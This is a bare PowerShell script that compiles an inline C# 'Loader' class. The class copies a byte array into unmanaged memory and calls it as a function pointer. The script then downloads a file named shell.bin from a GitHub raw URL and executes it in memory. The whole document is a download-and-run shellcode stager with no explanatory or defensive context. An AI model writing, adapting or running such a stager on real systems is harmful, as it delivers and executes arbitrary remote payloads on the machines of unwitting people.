$code = @"
using System;
using System.Runtime.InteropServices;

public class Loader {
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void ShellcodeDelegate();

    public static void Run(byte[] sc) {
        IntPtr ptr = Marshal.AllocHGlobal(sc.Length);
        Marshal.Copy(sc, 0, ptr, sc.Length);
        ShellcodeDelegate del = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellcodeDelegate));
        del();
    }
}
"@

Add-Type $code

$sc = (New-Object Net.WebClient).DownloadData("https://github.com/HexagonFetish/hello/raw/refs/heads/main/shell.bin")
[Loader]::Run($sc)
